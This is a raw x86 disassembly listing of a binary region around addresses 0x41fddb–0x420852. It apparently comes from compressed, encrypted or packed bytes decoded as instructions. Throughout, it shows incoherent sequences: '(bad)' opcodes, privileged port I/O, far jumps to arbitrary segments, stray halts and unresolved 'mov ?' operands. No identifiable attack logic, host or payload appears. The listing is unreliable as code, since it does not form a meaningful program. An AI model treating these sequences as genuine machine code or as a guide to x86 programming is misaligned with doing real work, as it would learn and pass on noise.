  41fddb:	mov    bh,0x2a
  41fddd:	jnp    0x41fe47
  41fddf:	test   BYTE PTR [ebx+0x44],0xfc
  41fde3:	xchg   ebp,eax
  41fde4:	fs add al,0xff
  41fde7:	mov    eax,0x41a257dd
  41fdec:	ins    BYTE PTR es:[edi],dx
  41fded:	(bad)  [esi-0xd]
  41fdf0:	fbstp  TBYTE PTR [edi-0x574e410e]
  41fdf6:	push   0xffffffd9
  41fdf8:	sub    al,0xa3
  41fdfa:	out    0x81,eax
  41fdfc:	push   esi
  41fdfd:	dec    esi
  41fdfe:	xlat   BYTE PTR ds:[ebx]
  41fdff:	ror    DWORD PTR [edx],cl
  41fe01:	js     0x41fd94
  41fe03:	mov    ah,0xa8
  41fe05:	cdq    
  41fe06:	int3   
  41fe07:	cmp    DWORD PTR [esi],ebp
  41fe09:	enter  0xbf03,0x63
  41fe0d:	mov    ss,WORD PTR [eax-0x1b]
  41fe10:	pop    ebp
  41fe11:	dec    ebp
  41fe12:	fistp  QWORD PTR [edi]
  41fe14:	fs push cs
  41fe16:	push   ecx
  41fe17:	push   edx
  41fe18:	push   ebp
  41fe19:	gs jle 0x41fdae
  41fe1c:	(bad)  
  41fe1d:	fsub   QWORD PTR [eax+0x76]
  41fe20:	pop    ebp
  41fe21:	xor    ch,ch
  41fe23:	ret    
  41fe24:	lock loop 0x41fe81
  41fe27:	mov    esi,DWORD PTR [edx+0x7b]
  41fe2a:	sub    dl,BYTE PTR [esi+eax*4-0x17]
  41fe2e:	addr16 mov eax,ds:0xbb4
  41fe32:	shr    BYTE PTR [ebp+0x1f],cl
  41fe35:	fidivr DWORD PTR [ebx-0x6a9c9893]
  41fe3b:	hlt    
  41fe3c:	les    edx,FWORD PTR [ebp-0x7520dce2]
  41fe42:	inc    ebp
  41fe43:	std    
  41fe44:	or     eax,DWORD PTR [eax]
  41fe46:	and    al,0xc1
  41fe48:	(bad)  
  41fe49:	jl     0x41fde6
  41fe4b:	dec    esp
  41fe4c:	jg     0x41fe83
  41fe4e:	imul   esi,DWORD PTR [eax],0xffffff88
  41fe51:	add    DWORD PTR [ebp-0x24],ebp
  41fe54:	mov    dh,0x77
  41fe56:	or     bl,dh
  41fe58:	popf   
  41fe59:	add    BYTE PTR [eax-0x76],0xe1
  41fe5d:	mov    al,ds:0xfdce9def
  41fe62:	rcl    DWORD PTR [ecx-0x3e],1
  41fe65:	jp     0x41fe3e
  41fe67:	xor    ecx,edx
  41fe69:	cmp    eax,0x4fe06cdc
  41fe6e:	scas   eax,DWORD PTR es:[edi]
  41fe6f:	out    dx,eax
  41fe70:	dec    edi
  41fe71:	pop    ecx
  41fe72:	mov    al,0x17
  41fe74:	ins    DWORD PTR es:[edi],dx
  41fe75:	dec    ebp
  41fe76:	loop   0x41fe44
  41fe78:	jp     0x41fe65
  41fe7a:	and    esp,DWORD PTR [esi-0x73]
  41fe7d:	xor    BYTE PTR [esi-0x2686874c],ah
  41fe83:	jne    0x41fef9
  41fe85:	test   bh,al
  41fe87:	iret   
  41fe88:	xchg   edi,eax
  41fe89:	fstp   QWORD PTR [eax-0x1a3098f3]
  41fe8f:	sub    eax,0x2f
	...
  41fef4:	stos   BYTE PTR es:[edi],al
  41fef5:	push   ebp
  41fef6:	call   0xfb5d:0xffefffe7
  41fefd:	(bad)  
  41fefe:	hlt    
  41feff:	mov    ah,0xa2
  41ff01:	xor    esi,DWORD PTR [ecx-0x5]
  41ff04:	pop    esp
  41ff05:	push   esp
  41ff06:	add    DWORD PTR [eax],eax
  41ff08:	add    eax,0xe2000001
  41ff0d:	in     al,dx
  41ff0e:	gs loopne 0x41ff10
  41ff11:	(bad)  
  41ff12:	faddp  st(4),st
  41ff14:	(bad)  
  41ff15:	pop    edi
  41ff16:	mov    eax,ds:0xb871e090
  41ff1b:	mov    ds:0x6b1a66d9,al
  41ff20:	jle    0x41ff6d
  41ff22:	sbb    DWORD PTR [ebx],esp
  41ff24:	ret    
  41ff25:	jecxz  0x41fed5
  41ff27:	lods   eax,DWORD PTR ds:[esi]
  41ff28:	ret    0x41c
  41ff2b:	popf   
  41ff2c:	push   eax
  41ff2d:	mov    ebp,0x2583d04a
  41ff32:	jle    0x41ff14
  41ff34:	stos   DWORD PTR es:[edi],eax
  41ff35:	mov    bl,0x52
  41ff37:	loope  0x41fedc
  41ff39:	fcomp  st(7)
  41ff3b:	jp     0x41fef8
  41ff3d:	add    cl,BYTE PTR [ebx+0x4faee87]
  41ff43:	add    al,0xd7
  41ff45:	dec    ecx
  41ff46:	aaa    
  41ff47:	neg    DWORD PTR [ecx+ecx*4]
  41ff4a:	adc    al,0x46
  41ff4c:	outs   dx,BYTE PTR ds:[esi]
  41ff4d:	push   es
  41ff4e:	inc    ebp
  41ff4f:	lods   al,BYTE PTR ds:[esi]
  41ff50:	jmp    0x49bf0997
  41ff55:	mov    esp,0x9e861932
  41ff5a:	aad    0xd4
  41ff5c:	adc    edx,0x75
  41ff5f:	fsubr  st,st(2)
  41ff61:	mov    cl,BYTE PTR [ebx+0x4ad899fe]
  41ff67:	cmp    bh,BYTE PTR [ebp+0x1fd35d96]
  41ff6d:	xor    al,0xad
  41ff6f:	sub    BYTE PTR [edx-0x787d64bd],0x83
  41ff76:	sub    eax,0x602567d5
  41ff7b:	outs   dx,BYTE PTR ds:[esi]
  41ff7c:	jmp    0x5109:0x93feb3d4
  41ff83:	pop    ebp
  41ff84:	push   ebp
  41ff85:	jbe    0x41ff42
  41ff87:	push   es
  41ff88:	ds lahf 
  41ff8a:	add    BYTE PTR [ebp+0x2fde8c07],bl
  41ff90:	enter  0x24d4,0xd9
  41ff94:	push   0x1e
  41ff96:	sbb    al,0x65
  41ff98:	pop    ss
  41ff99:	sub    edi,esi
  41ff9b:	adc    eax,0x3504cf27
  41ffa0:	je     0x41ff56
  41ffa2:	arpl   WORD PTR [ecx-0x3d7c06ce],bp
  41ffa8:	les    esp,FWORD PTR [edx]
  41ffaa:	mov    ecx,0x4c2d4923
  41ffaf:	fistp  WORD PTR [edi+edi*8+0x43]
  41ffb3:	dec    esp
  41ffb4:	xchg   BYTE PTR [ebx],bh
  41ffb6:	jg     0x41ffdd
  41ffb8:	and    eax,DWORD PTR [ecx-0xd6f81a3]
  41ffbe:	das    
  41ffbf:	frstor [edi+ecx*2+0x3a]
  41ffc3:	xchg   edi,eax
  41ffc4:	out    dx,al
  41ffc5:	sub    BYTE PTR [ecx-0x27c48595],ch
  41ffcb:	cmc    
  41ffcc:	mov    eax,ds:0xb74f4303
  41ffd1:	lea    ebp,[edx]
  41ffd3:	ins    BYTE PTR es:[edi],dx
  41ffd4:	jne    0x41fffa
  41ffd6:	int    0x5c
  41ffd8:	sbb    esi,DWORD PTR [eax]
  41ffda:	sub    edx,DWORD PTR [esi-0x67008f90]
  41ffe0:	push   esp
  41ffe1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffe2:	jae    0x41fffd
  41ffe4:	push   DWORD PTR [esi]
  41ffe6:	in     al,0xa
  41ffe8:	pop    ecx
  41ffe9:	add    BYTE PTR [ebx],dh
  41ffeb:	repnz adc al,0xae
  41ffee:	repz and esi,edi
  41fff1:	je     0x41ff73
  41fff3:	pop    ecx
  41fff4:	stc    
  41fff5:	mov    bl,0xa9
  41fff7:	leave  
  41fff8:	xor    al,0x9d
  41fffa:	sub    ebp,DWORD PTR [edi]
  41fffc:	in     eax,0x7d
  41fffe:	push   es
  41ffff:	ret    0xc76b
  420002:	and    ch,BYTE PTR [ebp-0x637b6721]
  420008:	loopne 0x41ffc5
  42000a:	rcr    eax,0x68
  42000d:	retf   
  42000e:	stos   BYTE PTR es:[edi],al
  42000f:	(bad)  
  420010:	pusha  
	...
  420071:	add    BYTE PTR [eax],al
  420073:	add    BYTE PTR [edx-0x5b],ah
  420076:	jbe    0x4200f7
  420078:	idiv   edi
  42007a:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0x1b
  420081:	push   0x55611b5f
  420086:	add    DWORD PTR [eax],eax
  420088:	add    eax,0x68000001
  42008d:	bound  esp,QWORD PTR ds:0x85f8ea68
  420093:	dec    ebp
  420094:	inc    ebp
  420095:	xor    dl,0x2b
  420098:	cmp    al,0xf
  42009a:	pop    ebx
  42009b:	mov    ah,0xd2
  42009d:	cmp    al,0x64
  42009f:	arpl   WORD PTR [edx+0x1b],di
  4200a2:	fwait
  4200a3:	mov    ds:0x7953ccde,eax
  4200a8:	add    cl,bh
  4200aa:	ror    DWORD PTR [edi],1
  4200ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200ad:	jge    0x4200cd
  4200af:	rol    ecx,cl
  4200b1:	jb     0x4200eb
  4200b3:	jne    0x42010f
  4200b5:	popa   
  4200b6:	pop    esp
  4200b7:	pop    edx
  4200b8:	aam    0x38
  4200ba:	mov    eax,ds:0x49d4350e
  4200bf:	jns    0x4200fa
  4200c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200c2:	inc    ebp
  4200c3:	inc    ecx
  4200c4:	xchg   DWORD PTR [edi-0x23efa477],ebp
  4200ca:	cmp    ebp,0x1b
  4200cd:	inc    ebx
  4200ce:	pusha  
  4200cf:	or     bl,BYTE PTR [ebx+0x3c56013d]
  4200d5:	ins    BYTE PTR es:[edi],dx
  4200d6:	pushf  
  4200d7:	cld    
  4200d8:	rcl    DWORD PTR [ebx],0x9b
  4200db:	lds    edx,FWORD PTR [esi-0x52ec6497]
  4200e1:	adc    eax,0xf1f2798f
  4200e6:	les    ebp,FWORD PTR [edx+0x5dd645b7]
  4200ec:	pop    eax
  4200ed:	ins    DWORD PTR es:[edi],dx
  4200ee:	jl     0x4200d2
  4200f0:	cwde   
  4200f1:	xor    ecx,esp
  4200f3:	xor    esi,DWORD PTR [ebx+0x57]
  4200f6:	inc    ecx
  4200f7:	fnstcw WORD PTR [edx]
  4200f9:	fisttp DWORD PTR [edi-0x16208045]
  4200ff:	pop    esi
  420100:	(bad)  
  420101:	jmp    0x42010f
  420103:	test   eax,0xae90dc21
  420108:	imul   edx,DWORD PTR [eax+0x2d],0x820765d2
  42010f:	sbb    dh,BYTE PTR [ebx+0x50baafeb]
  420115:	in     al,dx
  420116:	jae    0x420104
  420118:	cdq    
  420119:	sbb    ah,ah
  42011b:	cli    
  42011c:	push   0xfffffffc
  42011e:	and    WORD PTR [ebx],si
  420121:	jmp    0x42017e
  420123:	mov    ecx,0xbcab33cd
  420128:	pop    ebx
  420129:	mov    ebx,0x481b2a39
  42012e:	inc    ebx
  42012f:	mov    ebx,0x839a173e
  420134:	cs pop ecx
  420136:	jbe    0x4200d1
  420138:	mov    dh,0x27
  42013a:	xchg   edi,eax
  42013b:	pop    es
  42013c:	pop    ds
  42013d:	adc    al,0x7f
  42013f:	stc    
  420140:	add    ecx,ecx
  420142:	mov    edx,0x16e8d218
  420147:	cli    
  420148:	sub    esi,esp
  42014a:	ins    BYTE PTR es:[edi],dx
  42014b:	test   DWORD PTR [ebx+0x1ecac019],esi
  420151:	or     eax,0x41d3bb50
  420156:	add    eax,0xe27b2f28
  42015b:	xchg   DWORD PTR [esi+0x20],edx
  42015e:	iret   
  42015f:	cdq    
  420160:	(bad)  
  420161:	iret   
  420162:	addr16 iret 
  420164:	mov    esp,0x67606e97
  420169:	(bad)  
  42016a:	adc    ebx,DWORD PTR [ebp+edx*2-0x76]
  42016e:	inc    edi
  42016f:	mov    dl,0x7b
  420171:	test   eax,0x9fbff6f9
  420176:	fldz   
  420178:	stos   DWORD PTR es:[edi],eax
  420179:	pop    edx
  42017a:	dec    esi
  42017b:	sar    dh,1
  42017d:	ins    DWORD PTR es:[edi],dx
  42017e:	fwait
  42017f:	sar    ecx,0xac
  420182:	jmp    0x619a:0x27aaa80a
  420189:	lahf   
  42018a:	fist   WORD PTR [edi+0xf2e7a83]
  420190:	aam    0x0
	...
  4201f2:	add    BYTE PTR [eax],al
  4201f4:	jae    0x4201c5
  4201f6:	fwait
  4201f7:	cmp    DWORD PTR [edi-0x27300c83],edi
  4201fd:	stos   BYTE PTR es:[edi],al
  4201fe:	sar    BYTE PTR [ebx+0x15ba7f77],1
  420204:	push   si
  420206:	add    DWORD PTR [eax],eax
  420208:	add    eax,0x76000001
  42020d:	mov    al,0xa2
  42020f:	ret    
  420210:	test   al,0x3d
  420212:	inc    ebp
  420213:	mov    ecx,0x8ec09e2a
  420218:	or     eax,0x62918f7b
  42021d:	xor    al,0xda
  42021f:	push   ebp
  420220:	cmp    eax,0x5f3c20a4
  420225:	push   edi
  420226:	or     eax,0x4d7fe5ec
  42022b:	jno    0x420230
  42022d:	add    eax,0xd2dd9986
  420232:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420233:	fucomip st,st(5)
  420235:	mov    BYTE PTR [edx-0x5b],bh
  420238:	mov    esp,es
  42023a:	test   eax,0x7c0040c9
  42023f:	and    ebx,esi
  420241:	and    ebx,DWORD PTR [edi-0xd]
  420244:	sub    DWORD PTR [esi],0xc74035ae
  42024a:	inc    eax
  42024b:	fist   WORD PTR [edx+esi*2+0x2f]
  42024f:	repz pop ss
  420251:	test   eax,0xa4af6e38
  420256:	mov    edi,0x6bacc08c
  42025b:	mov    edi,esi
  42025d:	mov    DWORD PTR [esp+eax*4],ebx
  420260:	fcomi  st,st(6)
  420262:	retf   
  420263:	jnp    0x420261
  420265:	popa   
  420266:	add    eax,0x942b8fad
  42026b:	or     al,0x5c
  42026d:	cmp    al,0x31
  42026f:	mov    edi,0x7815122b
  420274:	mov    edi,0x3cf7720e
  420279:	cmp    ah,dl
  42027b:	mov    edx,ebx
  42027d:	pop    esi
  42027e:	push   ds
  42027f:	rcl    BYTE PTR [esi-0x68],0x3d
  420283:	loope  0x420288
  420285:	stc    
  420286:	test   eax,0x8d7bfbde
  42028b:	clc    
  42028c:	aad    0xa8
  42028e:	sub    edi,DWORD PTR [esp+ebp*1-0x4f]
  420292:	repz xchg esi,eax
  420294:	inc    edx
  420295:	test   eax,0x7db2aa05
  42029a:	inc    eax
  42029b:	and    eax,0xc1047abe
  4202a0:	pop    es
  4202a1:	pop    eax
  4202a2:	push   DWORD PTR [edx+edi*2]
  4202a5:	out    dx,eax
  4202a6:	mov    bh,0x64
  4202a8:	cmp    eax,0x4d8f9915
  4202ad:	stc    
  4202ae:	data16 and al,0xe2
  4202b1:	cld    
  4202b2:	out    0xe,al
  4202b4:	mov    ds:0xd206989c,al
  4202b9:	push   esi
  4202ba:	mov    dl,0xf
  4202bc:	jno    0x42028d
  4202be:	mov    ch,0xb7
  4202c0:	pushf  
  4202c1:	mov    DWORD PTR [ebp+0x797bd055],0x722bab54
  4202cb:	daa    
  4202cc:	mov    WORD PTR [eax],cs
  4202ce:	jp     0x4202a1
  4202d0:	push   cs
  4202d1:	ins    BYTE PTR es:[edi],dx
  4202d2:	(bad)  
  4202d3:	xlat   BYTE PTR ds:[ebx]
  4202d4:	xchg   cl,cl
  4202d6:	jge    0x420269
  4202d8:	xchg   esp,eax
  4202d9:	xchg   ebx,eax
  4202da:	and    eax,0xbdc3e148
  4202df:	jo     0x42026e
  4202e1:	xchg   ebp,eax
  4202e2:	mov    ah,0xda
  4202e4:	outs   dx,BYTE PTR ds:[esi]
  4202e5:	mov    gs,edi
  4202e7:	aam    0x9c
  4202e9:	adc    BYTE PTR [ebp+0x32],0x31
  4202ed:	xchg   ebp,eax
  4202ee:	pop    ss
  4202ef:	mov    BYTE PTR [ebp-0x20],cl
  4202f2:	or     dl,bl
  4202f4:	das    
  4202f5:	lahf   
  4202f6:	or     BYTE PTR [esi-0x42],0x51
  4202fa:	sub    edx,DWORD PTR [esi]
  4202fc:	aam    0x3f
  4202fe:	dec    esi
  4202ff:	nop
  420300:	mov    esp,0xa03da3b8
  420305:	jg     0x4202f0
  420307:	clc    
  420308:	and    eax,0x73ae7db9
  42030d:	add    BYTE PTR [edx],0xf4
  420310:	jb     0x420312
	...
  420372:	add    BYTE PTR [eax],al
  420374:	inc    ecx
  420375:	push   es
  420376:	clc    
  420377:	mov    esi,0xff47feff
  42037c:	and    BYTE PTR [eax+0x2a],bh
  42037f:	hlt    
  420380:	and    DWORD PTR [ecx+0x576b638b],0x1050001
  42038a:	add    BYTE PTR [eax],al
  42038c:	cli    
  42038d:	cmp    eax,0x7d8523f6
  420392:	xchg   BYTE PTR [esi+0x4d277f7d],bl
  420398:	lock jg 0x420336
  42039b:	mov    ?,WORD PTR [esi+0x166efdcf]
  4203a1:	nop
  4203a2:	push   0xffffffd8
  4203a4:	lods   eax,DWORD PTR ds:[esi]
  4203a5:	mov    BYTE PTR ds:0x90261001,cl
  4203ab:	pop    esp
  4203ac:	jge    0x4203fd
  4203ae:	or     DWORD PTR [ebp-0x8340f2a],0x34ef9c74
  4203b8:	sbb    al,0x44
  4203ba:	pop    ebp
  4203bb:	lds    edi,FWORD PTR [edx+0x54af165c]
  4203c1:	push   ebp
  4203c2:	shl    BYTE PTR [eax+0x7e],cl
  4203c5:	jg     0x42037d
  4203c7:	dec    esp
  4203c8:	add    DWORD PTR [ecx+0x3914937a],ebp
  4203ce:	mov    bh,0x99
  4203d0:	sbb    ebx,DWORD PTR ds:0x7112586c
  4203d6:	nop
  4203d7:	je     0x42041e
  4203d9:	adc    esi,DWORD PTR [esi]
  4203db:	inc    ecx
  4203dc:	push   ebp
  4203dd:	fpatan 
  4203df:	mov    dh,0x25
  4203e1:	mov    edi,0xa587fa0f
  4203e6:	dec    ebp
  4203e7:	pop    esi
  4203e8:	sbb    ebx,DWORD PTR [eax-0x1533cd19]
  4203ee:	add    DWORD PTR [edx],esp
  4203f0:	outs   dx,BYTE PTR ds:[esi]
  4203f1:	and    DWORD PTR [ebp-0x4458a37d],esp
  4203f7:	shl    DWORD PTR [ecx-0x6b],0x8d
  4203fb:	imul   esi,DWORD PTR fs:[esi+eax*1],0x73
  420400:	mov    edi,0xe83ef05d
  420405:	xchg   ecx,eax
  420406:	jmp    0x25ad:0x26ef0d4f
  42040d:	xor    BYTE PTR [ebx+0x5fb09365],cl
  420413:	sub    BYTE PTR [edx-0x7da4d0aa],0x72
  42041a:	fldcw  WORD PTR [edx-0x2e7b1612]
  420420:	sti    
  420421:	and    edi,DWORD PTR [ebx+0x5c]
  420424:	lock inc esp
  420426:	sbb    ecx,ebp
  420428:	mov    ecx,0xa65fd410
  42042d:	dec    eax
  42042e:	adc    cl,BYTE PTR [eax+0x236fb181]
  420434:	shr    DWORD PTR [ecx-0x3c],1
  420437:	lds    ebx,FWORD PTR [ecx+0xc1e024d]
  42043d:	sbb    al,0xb7
  42043f:	stos   BYTE PTR es:[edi],al
  420440:	mov    ds:0xfe5c6972,eax
  420445:	imul   edi,ebp,0x51
  420448:	bound  edi,QWORD PTR [ebx]
  42044a:	shl    esi,cl
  42044c:	mov    ds:0x9ed895a0,eax
  420452:	dec    ecx
  420453:	sub    eax,0xd6230ae4
  420458:	push   eax
  420459:	scas   al,BYTE PTR es:[edi]
  42045a:	inc    esi
  42045b:	stos   DWORD PTR es:[edi],eax
  42045c:	jl     0x42045d
  42045e:	push   0x17
  420460:	dec    ebx
  420461:	push   esp
  420462:	sahf   
  420463:	into   
  420464:	and    BYTE PTR [ebp+0x79065fe5],dl
  42046a:	push   edx
  42046b:	xchg   ebp,eax
  42046c:	mov    ch,0x3c
  42046e:	fisubr DWORD PTR [esi-0x54]
  420471:	or     DWORD PTR [ecx+0x15322f22],edx
  420477:	mov    BYTE PTR [edx+0x5a8a341d],ch
  42047d:	idiv   DWORD PTR [ebp-0x72]
  420480:	outs   dx,DWORD PTR ds:[esi]
  420481:	push   0xffffffcf
  420483:	das    
  420484:	jnp    0x420485
  420486:	popa   
  420487:	sub    cl,BYTE PTR [ebx-0x16]
  42048a:	and    eax,0x7d1a4fc0
  42048f:	sub    al,0x85
	...
  4204f1:	add    BYTE PTR [eax],al
  4204f3:	add    BYTE PTR [esi+0x7f125794],ch
  4204f9:	shr    edi,cl
  4204fb:	mov    esp,0x5a7f6c39
  420500:	inc    ecx
  420501:	cs jmp 0x19a756c
  420507:	add    BYTE PTR ds:0x14000001,al
  42050d:	push   cs
  42050e:	pop    esi
  42050f:	das    
  420510:	rcr    edi,cl
  420512:	mov    dl,0x6a
  420514:	fild   WORD PTR [edi+edi*8+0xc]
  420518:	and    al,0x6d
  42051a:	push   edx
  42051b:	out    0x5,eax
  42051d:	retf   
  42051e:	xor    ebx,DWORD PTR [esi-0x52]
  420521:	enter  0xa347,0xe9
  420525:	(bad)  
  420527:	dec    edx
  420528:	adc    bh,BYTE PTR [edx-0x11e3889a]
  42052e:	outs   dx,DWORD PTR ds:[esi]
  42052f:	inc    esp
  420530:	pop    edx
  420531:	push   ds
  420532:	xchg   esi,eax
  420533:	lds    ebx,FWORD PTR [edx]
  420535:	cli    
  420536:	ins    DWORD PTR es:[edi],dx
  420537:	adc    al,0x75
  420539:	mov    cl,0xbd
  42053b:	pop    ss
  42053c:	inc    esi
  42053d:	mov    ecx,0x1f79a6b0
  420542:	and    DWORD PTR [eax+ecx*2+0xce9fee0],ebx
  420549:	lds    edx,FWORD PTR [ecx+0xe3442e0]
  42054f:	sbb    al,0x5b
  420551:	adc    dh,bh
  420553:	xor    edx,edx
  420555:	inc    ecx
  420556:	int3   
  420557:	std    
  420558:	cld    
  420559:	mov    ds:0x880792d9,eax
  42055e:	imul   esi,DWORD PTR [ebx-0x24],0xddde1ba7
  420565:	(bad)  
  420566:	rcr    edi,cl
  420568:	arpl   WORD PTR [ecx+0x62],si
  42056b:	arpl   WORD PTR [edi],sp
  42056d:	mov    dl,0x5a
  42056f:	and    esi,ebp
  420571:	sbb    DWORD PTR [esi-0x65],ebp
  420574:	in     eax,dx
  420575:	and    eax,0x1f989281
  42057a:	pop    ds
  42057b:	sub    BYTE PTR [edi-0x54],cl
  42057e:	mov    dl,0x35
  420580:	mov    cl,0x5b
  420582:	les    ebp,FWORD PTR ds:0xba8429d9
  420588:	dec    esp
  420589:	sub    BYTE PTR [ecx],0xc
  42058c:	add    al,0x1f
  42058f:	js     0x4205b3
  420591:	repnz in eax,dx
  420593:	jnp    0x420607
  420595:	pop    ss
  420596:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420597:	addr16 sub al,0xa8
  42059a:	push   edx
  42059b:	test   DWORD PTR [eax+0x7f644a1],eax
  4205a1:	es inc esp
  4205a3:	xchg   ebp,eax
  4205a4:	mov    ds:0x37b27d05,al
  4205a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205aa:	rol    BYTE PTR [esi-0x3dadd447],1
  4205b0:	lods   al,BYTE PTR ds:[esi]
  4205b1:	push   0xffffffa1
  4205b3:	jle    0x4205f5
  4205b5:	jno    0x420544
  4205b7:	les    edi,FWORD PTR [ebp*2-0x769d9709]
  4205be:	mov    al,ds:0x2649f3e8
  4205c3:	jb     0x420568
  4205c5:	jnp    0x42061a
  4205c7:	sub    eax,0xe4219819
  4205cc:	lahf   
  4205cd:	mov    ds,WORD PTR [esi-0x2e]
  4205d0:	ja     0x42063b
  4205d2:	mov    ds:0x4189b5e3,al
  4205d7:	lods   eax,DWORD PTR ds:[esi]
  4205d8:	push   es
  4205d9:	adc    bh,BYTE PTR [esi+0x43]
  4205dc:	adc    BYTE PTR [esi+0x523d29b7],ah
  4205e2:	jnp    0x42064d
  4205e4:	shl    BYTE PTR [ebx+eiz*1],0x44
  4205e8:	(bad)  
  4205e9:	jno    0x42062a
  4205eb:	xor    eax,0xe480a82c
  4205f0:	pop    edx
  4205f1:	dec    esp
  4205f2:	pop    es
  4205f3:	js     0x4205fa
  4205f5:	push   es
  4205f6:	stos   DWORD PTR es:[edi],eax
  4205f7:	and    al,0xe8
  4205f9:	shr    BYTE PTR [esi+0x2e475993],cl
  4205ff:	xchg   ebp,eax
  420600:	pop    ebx
  420601:	int3   
  420602:	add    DWORD PTR [eax-0x184d8331],0xbfe8af2
  42060c:	(bad)  
  42060d:	leave  
  42060e:	inc    edx
  42060f:	inc    ecx
  420610:	cmp    eax,0x0
	...
  420671:	add    BYTE PTR [eax],al
  420673:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  42067a:	mov    ah,0xec
  42067c:	lds    eax,FWORD PTR [eax]
  42067e:	aad    0x78
  420680:	je     0x420609
  420682:	jmp    0x420640
  420684:	jne    0x4206df
  420686:	add    DWORD PTR [eax],eax
  420688:	add    eax,0xd8000001
  42068d:	idiv   DWORD PTR [eax+ecx*2-0x7d63f43a]
  420694:	test   dh,0x9c
  420697:	jns    0x420630
  420699:	fs dec esp
  42069b:	retf   0x6a31
  42069e:	dec    ecx
  4206a0:	out    dx,eax
  4206a1:	xor    eax,0xe1c56bb1
  4206a6:	sub    esp,DWORD PTR [ecx+0x49]
  4206a9:	cs dec edi
  4206ab:	call   0x1fcef4d4
  4206b0:	in     eax,0x31
  4206b2:	out    dx,al
  4206b3:	js     0x4206d8
  4206b5:	loope  0x42063f
  4206b7:	push   ebp
  4206b8:	push   ds
  4206b9:	nop
  4206ba:	aad    0x51
  4206bc:	(bad)  
  4206bd:	hlt    
  4206be:	test   DWORD PTR ds:0x8fd8eb88,edx
  4206c4:	jmp    0xf4824c8e
  4206c9:	ss (bad) 
  4206cb:	(bad)  
  4206cd:	dec    ebp
  4206ce:	and    dl,BYTE PTR [esi]
  4206d0:	leave  
  4206d1:	xor    eax,0x66d11baf
  4206d6:	shl    ecx,1
  4206d8:	(bad)  
  4206d9:	and    al,0xe1
  4206db:	clc    
  4206dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206dd:	jmp    0xdbdc:0xaf0b42fa
  4206e4:	retf   0xcec2
  4206e7:	jecxz  0x42075d
  4206e9:	jl     0x420729
  4206eb:	mov    ?,eax
  4206ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206ee:	pushf  
  4206ef:	neg    DWORD PTR [ecx-0x5a7ab5b4]
  4206f5:	mov    eax,ds:0x4da42f29
  4206fa:	dec    eax
  4206fb:	sub    esp,DWORD PTR [eax+0x4f]
  4206fe:	xchg   edx,eax
  4206ff:	sub    DWORD PTR [ebx],ebp
  420701:	gs ins DWORD PTR es:[edi],dx
  420703:	out    dx,eax
  420704:	lods   eax,DWORD PTR ds:[esi]
  420705:	rol    DWORD PTR [esi-0x4bcb33f6],cl
  42070b:	adc    DWORD PTR [ecx],ecx
  42070d:	loope  0x42070e
  42070f:	stc    
  420710:	and    eax,0xabc90fce
  420715:	stc    
  420716:	cld    
  420717:	or     ah,BYTE PTR [edx]
  420719:	loopne 0x42072d
  42071b:	loop   0x4206d3
  42071d:	pushf  
  42071e:	xor    BYTE PTR [edx],al
  420720:	lods   al,BYTE PTR ds:[esi]
  420721:	ins    DWORD PTR es:[edi],dx
  420722:	xor    ebp,DWORD PTR [ecx+0x2f9d0786]
  420728:	pop    ebp
  420729:	aaa    
  42072a:	mov    edi,ebx
  42072c:	mov    bl,0xee
  42072e:	jb     0x42071f
  420730:	pop    ss
  420731:	jge    0x42074d
  420733:	ret    
  420734:	inc    ecx
  420735:	dec    esi
  420736:	mov    bh,0x50
  420738:	pop    edx
  420739:	adc    DWORD PTR [ebx+eiz*8],esi
  42073c:	adc    al,0xca
  42073e:	jmp    0x990e2d37
  420743:	xor    DWORD PTR [eax+ebp*4+0x2a95921c],eax
  42074a:	js     0x420769
  42074c:	(bad)  
  42074d:	jg     0x42077b
  42074f:	std    
  420750:	fdiv   QWORD PTR [ebp+0x54]
  420753:	push   ebp
  420754:	mov    edi,0x471b0b9a
  420759:	clc    
  42075a:	inc    ecx
  42075b:	mov    al,0x1c
  42075d:	sbb    al,0x10
  42075f:	ja     0x420787
  420761:	and    esp,esi
  420763:	in     eax,dx
  420764:	push   ebx
  420765:	mov    ?,WORD PTR [ebx-0x5a243b95]
  42076b:	mov    BYTE PTR [ebx+0x21],dh
  42076e:	add    BYTE PTR [esi+0x29],dh
  420771:	xchg   esi,eax
  420772:	pop    edx
  420773:	test   eax,0x64523155
  420778:	sub    esi,DWORD PTR [ebx]
  42077a:	jne    0x4207d7
  42077c:	shr    DWORD PTR [esi-0x2e],1
  42077f:	sub    DWORD PTR [esi-0x1a89290],0x7a7ed412
  420789:	in     al,dx
  42078a:	pop    ss
  42078b:	add    DWORD PTR [eax-0x6b949d08],0x0
	...
  4207f2:	add    BYTE PTR [eax],al
  4207f4:	mov    DWORD PTR [edi],ebp
  4207f6:	and    eax,0xad8aa780
  4207fb:	das    
  4207fc:	cmp    DWORD PTR [edi-0x24],ebp
  4207ff:	pusha  
  420800:	scas   al,BYTE PTR es:[edi]
  420801:	cmp    eax,0x5a7a927e
  420806:	add    DWORD PTR [eax],eax
  420808:	add    eax,0x6e000001
  42080d:	and    BYTE PTR ds:0x5cde783f,ch
  420813:	pop    edx
  420814:	sar    BYTE PTR [edi+ebp*1-0x6c42c5e8],cl
  42081b:	cmp    eax,0x82b6adab
  420820:	pop    ss
  420821:	push   eax
  420822:	jge    0x420885
  420824:	mov    edi,0xca317833
  420829:	or     ecx,DWORD PTR [edi+0x131c66b3]
  42082f:	pop    ecx
  420830:	or     dl,ah
  420832:	dec    esp
  420834:	mov    ds,WORD PTR [edi-0x3b0d51ee]
  42083a:	sti    
  42083b:	cmc    
  42083c:	hlt    
  42083d:	mov    ah,0xa3
  42083f:	or     esi,ecx
  420841:	xor    DWORD PTR [edx],edi
  420843:	iret   
  420844:	xlat   BYTE PTR ds:[ebx]
  420845:	fmul   st(3),st
  420847:	pop    esp
  420848:	clc    
  420849:	in     eax,0xc8
  42084b:	das    
  42084c:	into   
  42084d:	mov    ebx,0x5b509a13
  420852:	and    DWORD PTR [edx*1+0x7c0e25f4],ebx
